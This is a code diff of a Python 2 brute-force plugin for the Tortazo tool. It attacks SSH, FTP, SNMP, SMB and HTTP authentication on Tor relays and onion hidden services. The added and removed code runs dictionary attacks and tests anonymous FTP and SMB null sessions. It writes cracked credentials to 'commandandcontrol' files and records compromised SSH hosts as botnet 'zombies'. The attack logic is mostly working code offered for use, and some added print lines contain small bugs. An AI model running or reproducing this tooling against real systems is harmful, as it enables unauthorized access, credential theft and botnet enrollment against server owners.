@@ -22,14 +22,9 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 '''
 
 from core.tortazo.pluginManagement.BasePlugin import BasePlugin
-from pysnmp.entity.rfc3413.oneliner import cmdgen
 from prettytable import PrettyTable
-import paramiko
-import ftplib
 import os
 import sys
-from smb.SMBConnection import SMBConnection
-import logging as log
 from socket import error as socket_error
 
 class bruterPlugin(BasePlugin):
@@ -56,13 +51,6 @@ class bruterPlugin(BasePlugin):
         if len(self.torNodes) > 0:
             self.info("[*] bruterPlugin Destroyed!")
 
-    #WRITE THIS FUNCION IN BASEPLUGIN!!!
-    def testingSocat(self):
-        from subprocess import Popen, PIPE, STDOUT
-        cmd = os.getcwd()+'/plugins/utils/socat/socat TCP4-LISTEN:139,reuseaddr,fork SOCKS4A:127.0.0.1:nwoh63bjv77u7llm.onion:139,socksport=9150'
-        p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=True)
-        print p.pid
-
     def setDictSeparator(self, separator):
         print "[+] Setting separator '%s' for dictionary files. Every line en the file must contain <user><separator><passwd>" %(separator)
         self.separator = separator
@@ -71,7 +59,6 @@ class bruterPlugin(BasePlugin):
     ###########################FUNCTIONS TO PERFORM SSH BRUTEFORCE ATTACKS.#########################################################################
     ################################################################################################################################################
     def sshBruterOnRelay(self, relay, port=22, dictFile=None, force=False):
-        self.unsetSocksProxy()
         if self.bruteForceData.has_key(relay) == False and force==False:
             print "[-] IP Adress %s not found in the relays. If you want to run the scan against this host, use the parameter 'force=True' of this function" %(relay)
             return
@@ -91,7 +78,8 @@ class bruterPlugin(BasePlugin):
                     break
                 for passwd in passList:
                     try:
-                        if self.performSSHConnection(relay, port, user, passwd):
+                        if self.serviceConnector.performSSHConnection(relay, port, user, passwd):
+                            print "[+] SSH BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                             stop_attack = True
                             break
                     except:
@@ -105,7 +93,8 @@ class bruterPlugin(BasePlugin):
             for line in open(dictFile, "r").readlines():
                 [user, passwd] = line.strip().split(self.separator)
                 try:
-                    if self.performSSHConnection(relay, port, user, passwd):
+                    if self.serviceConnector.performSSHConnection(relay, port, user, passwd):
+                        print "[+] SSH BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                         break
                 except:
                     print "[-] Captured exception. Finishing attack."
@@ -132,7 +121,8 @@ class bruterPlugin(BasePlugin):
                     break
                 for password in passList:
                     try:
-                        if self.performSSHConnectionHiddenService(onionService, port, user, password):
+                        if self.serviceConnector.performSSHConnectionHiddenService(onionService, port, user, password):
+                            print "[+] SSH BruteForce attack successfully. User %s - Passwd %s " %(user, password)
                             stop_attack = True
                             break
                     except socket_error as serr:
@@ -147,7 +137,8 @@ class bruterPlugin(BasePlugin):
             for line in open(dictFile, "r").readlines():
                 [user, password] = line.strip().split(self.separator)
                 try:
-                    if self.performSSHConnectionHiddenService(onionService, port, user, password):
+                    if self.serviceConnector.performSSHConnectionHiddenService(onionService, port, user, password):
+                        print "[+] SSH BruteForce attack successfully. User %s - Passwd %s " %(user, password)
                         break
                 except socket_error as serr:
                     print "Connection Refused... Finishing the attack."
@@ -169,7 +160,8 @@ class bruterPlugin(BasePlugin):
             self.unsetSocksProxy()
         print "[+] Starting FTP BruteForce mode against %s on port %s" %(host, str(port))
         print "[+] Trying Anonymous access in: %s " %(host)
-        if self.anonymousFTPAccess(host,port):
+        if self.serviceConnector.anonymousFTPAccess(host,port):
+            print "[+] FTP Anonymous access allowed in % " %(host)
             return
 
         if dictFile is not None and os.path.exists(dictFile):
@@ -177,7 +169,8 @@ class bruterPlugin(BasePlugin):
             for line in open(dictFile, "r").readlines():
                 [user, passwd] = line.strip().split(self.separator)
                 try :
-                    if self.performFTPConnection(host,port, user=user, passwd=passwd):
+                    if self.serviceConnector.performFTPConnection(host,port, user=user, passwd=passwd):
+                        print "[+] FTP BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                         break
                 except Exception as excep:
                     print "[-] Captured exception. Finishing attack."
@@ -191,10 +184,11 @@ class bruterPlugin(BasePlugin):
             try :
                 for user in usersList:
                     #Same user and password are valid?
-                    if self.performFTPConnection(host,port, user=user, passwd=user):
+                    if self.serviceConnector.performFTPConnection(host,port, user=user, passwd=user):
                         break
                     for passwd in passList:
-                        if self.performFTPConnection(host,port, user=user, passwd=passwd):
+                        if self.serviceConnector.performFTPConnection(host,port, user=user, passwd=passwd):
+                            print "[+] FTP BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                             return
             except Exception as excep:
                 print "[-] Captured exception. Finishing attack."
@@ -208,7 +202,6 @@ class bruterPlugin(BasePlugin):
         
 
     def ftpBruterOnHiddenService(self, onionService, port=21, dictFile=None):
-        self.setSocksProxy()
         self.ftpBruterOnRelay(onionService,port=port, dictFile=dictFile, proxy=True)
 
 
@@ -226,7 +219,8 @@ class bruterPlugin(BasePlugin):
             for line in open(dictFile, "r").readlines():
                 [user, passwd] = line.strip().split(self.separator)
                 try :
-                    if self.performSNMPConnection(host,port, user=user, passwd=passwd):
+                    if self.serviceConnector.performSNMPConnection(host,port, user=user, passwd=passwd):
+                        print "[+] SNMP BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                         break
                 except Exception as excep:
                     print "[-] Captured exception. Finishing attack."
@@ -237,7 +231,7 @@ class bruterPlugin(BasePlugin):
             communities = self.getSNMPCommunitiesFromFuzzDB()
             try :
                 for community in communities:
-                    if self.performSNMPConnection(host,port, community=community):
+                    if self.serviceConnector.performSNMPConnection(host,port, community=community):
                         break
             except Exception as excep:
                 print "[-] Captured exception. Finishing attack."
@@ -252,10 +246,9 @@ class bruterPlugin(BasePlugin):
     ###########################FUNCTIONS TO PERFORM SMB BRUTEFORCE ATTACKS.#########################################################################
     ################################################################################################################################################
     def smbBruterOnRelay(self, host, port=139, dictFile=None):
-        self.unsetSocksProxy()
         print "[+] Starting SMB BruteForce mode against %s on port %s" %(host, str(port))
         print "[+] Testing a Null-Session against the target."
-        if self.performSMBConnection(host, port,'',''):
+        if self.serviceConnector.performSMBConnection(host, port,'',''):
             print "[+] SMB Null-Session found in host: %s " %(host)
             return
 
@@ -264,7 +257,8 @@ class bruterPlugin(BasePlugin):
             for line in open(dictFile, "r").readlines():
                 [user, passwd] = line.strip().split(self.separator)
                 try :
-                    if self.performSMBConnection(host,port, user=user, passwd=passwd):
+                    if self.serviceConnector.performSMBConnection(host,port, user=user, passwd=passwd):
+                        print "[+] SMB BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                         break
                 except Exception as excep:
                     print "[-] Captured exception. Finishing attack."
@@ -278,10 +272,12 @@ class bruterPlugin(BasePlugin):
             try :
                 for user in usersList:
                     #Same user and password are valid?
-                    if self.performSMBConnection(host,port, user=user, passwd=user):
+                    if self.serviceConnector.performSMBConnection(host,port, user=user, passwd=user):
+                        print "[+] SMB BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                         break
                     for passwd in passList:
-                        if self.performSMBConnection(host,port, user=user, passwd=passwd):
+                        if self.serviceConnector.performSMBConnection(host,port, user=user, passwd=passwd):
+                            print "[+] SMB BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                             return
             except Exception as excep:
                 print "[-] Captured exception. Finishing attack."
@@ -302,15 +298,19 @@ class bruterPlugin(BasePlugin):
     ################################################################################################################################################
     ###########################FUNCTIONS TO PERFORM HTTP BRUTEFORCE ATTACKS.########################################################################
     ################################################################################################################################################
-    def httpBruterOnRelay(self, host, port=80, dictFile=None):
-        self.unsetSocksProxy()
-        print "[+] Starting HTTP BruteForce mode against %s on port %s" %(host, str(port))
+    def httpBruterOnSite(self, url, dictFile=None, proxy=False):
+        if proxy:
+            self.setSocksProxy()
+        else:
+            self.unsetSocksProxy()
+        print "[+] Starting HTTP BruteForce mode against %s " %(url)
         if dictFile is not None and os.path.exists(dictFile):
             print "[+] Reading the Passwords file %s " %(dictFile)
             for line in open(dictFile, "r").readlines():
                 [user, passwd] = line.strip().split(self.separator)
                 try :
-                    if self.performHTTPAuthConnection(host,port, user=user, passwd=passwd):
+                    if self.serviceConnector.performHTTPAuthConnection(url, user=user, passwd=passwd):
+                        print "[+] HTTP BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                         break
                 except Exception as excep:
                     print "[-] Captured exception. Finishing attack."
@@ -324,10 +324,12 @@ class bruterPlugin(BasePlugin):
             try :
                 for user in usersList:
                     #Same user and password are valid?
-                    if self.performHTTPAuthConnection(host,port, user=user, passwd=user):
+                    if self.serviceConnector.performHTTPAuthConnection(url, user=user, passwd=user):
+                        print "[+] HTTP BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                         break
                     for passwd in passList:
-                        if self.performHTTPAuthConnection(host,port, user=user, passwd=passwd):
+                        if self.serviceConnector.performHTTPAuthConnection(url, user=user, passwd=passwd):
+                            print "[+] HTTP BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                             return
             except Exception as excep:
                 print "[-] Captured exception. Finishing attack."
@@ -335,199 +337,17 @@ class bruterPlugin(BasePlugin):
                 return
 
 
-    def smbBruterOnAllRelays(self, relay, port=139, dictFile=None):
-        for relay in self.bruteForceData:
-            self.smbBruterOnRelay(relay, port=port, dictFile=dictFile)
+    def httpBruterOnHiddenService(self, onionService, dictFile=None):
+        if onionService.startswith('http://') == False:
+            self.httpBruterOnSite('http://'+onionService,dictFile=dictFile, proxy=True)
+        else:
+            self.httpBruterOnSite(onionService,dictFile=dictFile, proxy=True)
 
-
-    def smbBruterOnHiddenService(self, onionService, dictFile=None):
-        if dictFile is None:
-            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."
 
 
     ################################################################################################################################################
     ###########################   COMMON FUNCTIONS.   ##############################################################################################
     ################################################################################################################################################
-
-    def anonymousFTPAccess(self,host, port):
-        try:
-            ftpFileName = 'commandandcontrolftp.txt'
-            ftpClient = ftplib.FTP()
-            ftpClient.connect(host, port)
-            ftpClient.login()
-            print "[+] Anonymous access allowed in: %s Go for it!" %(host)
-            ftpFile = open(ftpFileName, 'a')
-            entry = '%s:%s:%s' %(host, 'anonymous', 'anonymous')
-            ftpFile.write(entry+'\n')
-            ftpFile.close()
-        except:
-            print "[-] Anonymous access is not allowed in: %s "%(host)
-            return False
-        return True
-
-    def performFTPConnection(self, host, port, user, passwd):
-        ftpFileName = 'commandandcontrolftp.txt'
-        try :
-            sessionFtp = ftplib.FTP()
-            sessionFtp.connect(host=host, port=port)
-            success = sessionFtp.login(user, passwd)
-            if success:
-                ftpFile = open(ftpFileName, 'a')
-                print "[+] FTP Connection Success ... username: %s and passoword %s are VALID! " % (user, passwd)
-                sessionFtp.quit()
-                sessionFtp.close()
-                entry = '%s:%s:%s' %(host, user, passwd)
-                ftpFile.write(entry+'\n')
-                ftpFile.close()
-                return True
-        except ftplib.socket.gaierror as sockerror:
-            print "An error ocurred. See the full trace: "
-            print sys.exc_info()
-            raise sockerror
-        except ftplib.all_errors, e:
-            errorcode_string = str(e).split(None, 1)
-            print errorcode_string
-            if errorcode_string[0] == '530':
-                if "Login" in errorcode_string[1]:
-                    return False
-
-
-    def performSSHConnection(self, host, port, user, passwd):
-        '''
-        Perform SSH Connections using the tortazo_botnet.bot file.
-        '''
-        self.cli.logger.basicConfig(format="%(levelname)s: %(message)s", level=log.WARN)
-        tortazoFile = os.getcwd()+'/tortazo_botnet.bot'
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        sshFileName = 'commandandcontrolssh.txt'
-        try:
-            client.connect(host, port, username=user, password=passwd)
-        except paramiko.AuthenticationException:
-            return False
-        except paramiko.SSHException as sshExc:
-            print "Seems that the SSH Service is not running. Please, check that before running the bruteforce attack."
-            raise sshExc
-        except Exception as exc:
-            print "An error ocurred. See the full trace: "
-            print sys.exc_info()
-            raise exc
-        if client:
-            print "[+] SSH Connection Success ... username: %s and password %s are VALID! " % (user, passwd)
-            client.close()
-            sshFileName = os.getcwd()+'/commandandcontrolssh.txt'
-            if os.path.exists(sshFileName) == False:
-                sshFile = open(sshFileName, 'w')
-            else:
-                sshFile = open(sshFileName, 'a')
-            entry =  '%s:%s:%s' %(host, user, passwd)
-            sshFile.write(entry+'\n')
-            sshFile.close()
-            print "[+] Updating the file 'tortazo_botnet.bot' with the new Zombie"
-            if os.path.exists(tortazoFile) == False:
-                tortazoFd = open(tortazoFile, 'w')
-            else:
-                tortazoFd = open(tortazoFile, 'a')
-            #host:user:pass:port:nickname
-            nickname = '--'
-            for torNode in self.torNodes:
-                if torNode.host == host:
-                    nickname = torNode.nickName
-                    break
-            entryBotnet = '%s:%s:%s:%s:%s' %(host, user, passwd, port, nickname)
-            content = open(tortazoFile, 'r').readlines()
-            if entryBotnet in content:
-                print "[-] Entry duplicated. Server already added in the 'tortazo_botnet.bot' file"
-            else:
-                tortazoFd.write(entryBotnet+'\n')
-                print "[+] Entry %s added" %(entry)
-                tortazoFd.close()
-            return True
-
-    def performSSHConnectionHiddenService(self, onionService, port, user, passwd):
-        self.cli.logger.basicConfig(format="%(levelname)s: %(message)s", level=self.cli.logger.ERROR)
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        proxyCommand = os.getcwd()+'/plugins/connect-socks -S '+self.socksHost+':'+str(self.socksPort)+' '+onionService+' '+str(port)
-        proxy = paramiko.ProxyCommand(proxyCommand)
-        try:
-            # IF Hidden Service is incorrect: SSHException: Error reading SSH protocol banner
-            # IF Bad user/passwd: AuthenticationException:
-            # IF Bad Proxy: ProxyCommandFailure:
-
-            client.connect(onionService, port, username=user, password=passwd, sock=proxy)
-        except paramiko.AuthenticationException:
-            return False
-        except paramiko.ProxyCommandFailure as proxyExc:
-            print "Proxy Failure. The settings used are: Host=%s and Port=%s. Check your TOR Socks proxy if you haven't used the options -T and -U." %(self.socksHost,self.socksPort)
-            raise proxyExc
-        except paramiko.SSHException as sshExc:
-            print "Seems that the Hidden Service is not running. Please, check that before running the bruteforce attack."
-            raise sshExc
-        except Exception as exc:
-            print "An error ocurred. See the full trace: "
-            print sys.exc_info()
-            raise exc
-
-        if client:
-            print "[+] SSH Connection Success ... username: %s and password %s are VALID! " % (user, passwd)
-            sshFileName = os.getcwd()+'/commandandcontrolssh.txt'
-            if os.path.exists(sshFileName) == False:
-                sshFile = open(sshFileName, 'w')
-            else:
-                sshFile = open(sshFileName, 'a')
-            entry =  '%s:%s:%s' %(onionService, user, passwd)
-            sshFile.write(entry+'\n')
-            sshFile.close()
-            client.close()
-
-    def performSNMPConnection(self, host, port=161, community='public'):
-        snmpCmdGen = cmdgen.CommandGenerator()
-        print "[+] Trying community name: %s " %(community)
-        snmpTransportData = cmdgen.UdpTransportTarget((host, port))
-        mib = cmdgen.MibVariable('SNMPv2-MIB', 'sysName', 0)
-        error, errorStatus, errorIndex, binds = snmpCmdGen.getCmd(cmdgen.CommunityData(community), snmpTransportData, mib)
-
-        if error:
-            # Check for errors and print out results
-            return False
-        else:
-            print "[*] SNMP Bruteforce Success ... community name: %s is VALID! " % (community)
-            return True
-
-    def performSMBConnection(self, host, port, user, passwd):
-        import socket
-        client_name =socket.gethostname()
-        smbClient = SMBConnection(user, passwd, client_name, "", use_ntlm_v2 = True)
-        if smbClient.connect(host, port):
-            print "[+] SMB Connection Success ... username: %s and passoword %s are VALID! " % (user, passwd)
-            print "[+] Listing the Shared resources"
-            for share in smbClient.listShares():
-                print "[*][*] Resource name: %s " %(share.name)
-            return True
-        else:
-            return False
-
-
-    def performHTTPAuthConnection(self, url, port, user, passwd):
-        import requests
-        initialResponse = requests.get(url)
-        if initialResponse.status_code == 401:
-            if initialResponse.has_key('www-authenticate') and 'Digest' in initialResponse['www-authenticate']:
-                #Digest Auth.
-                print "[+] Header 'www-authenticate' in response. Digest Authentication requested by the server."
-                from requests.auth import HTTPDigestAuth
-                res = requests.get(url, auth=HTTPDigestAuth(user, passwd))
-            elif initialResponse.has_key('www-authenticate') and 'Basic' in initialResponse['www-authenticate']:
-                #Basic Auth.
-                print "[+] Header 'www-authenticate' in response. Basic Authentication requested by the server."
-                from requests.auth import HTTPBasicAuth
-                res = requests.get(url, auth=HTTPBasicAuth(user, passwd))
-            if res and res.status_code == 200:
-                print "[+] HTTP Auth Connection Success ... username: %s and passoword %s are VALID! " % (user, passwd)
-                return True
-            else:
-                return False
 
     def getUserlistFromFuzzDB(self):
         '''
